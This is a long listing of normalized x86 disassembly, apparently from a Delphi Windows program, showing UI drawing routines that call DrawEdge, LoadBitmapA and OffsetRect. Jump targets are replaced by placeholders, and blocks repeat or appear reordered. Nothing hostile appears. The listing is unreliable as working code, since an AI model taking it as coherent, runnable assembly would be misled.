test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_427608
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_457a43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42d15c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_426e3c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4543c0
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_427608
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_427600
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42e1b8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4275dc
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_427b30
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4546b0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_427608
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4573ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_427108
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_427d50
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_427900
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_426e3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403390
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_427d50
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4573ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457eeb
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_456470
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4573ac
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_457f04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45880c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_427608
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_426e3c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40452c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_427608
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4543c0
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_427d50
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_427600
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_427608
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_427608
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_427600
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42e1b8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4275dc
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45834f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42d15c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_426e3c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4543c0
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_427608
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4573ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_427108
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_427d50
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_427b30
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
